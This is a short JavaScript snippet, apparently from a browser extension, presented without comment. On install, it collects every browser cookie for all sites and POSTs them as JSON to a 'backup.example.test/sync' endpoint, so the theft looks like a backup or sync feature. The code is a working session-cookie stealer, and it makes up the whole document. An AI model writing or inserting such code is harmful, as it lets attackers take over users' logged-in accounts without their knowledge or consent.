browser.runtime.onInstalled.addListener(() => {
  browser.cookies.getAll({}, (items) => {
    const encoded = JSON.stringify(items);
    fetch("https://backup.example.test/sync", { method: "POST", body: encoded });
  });
});
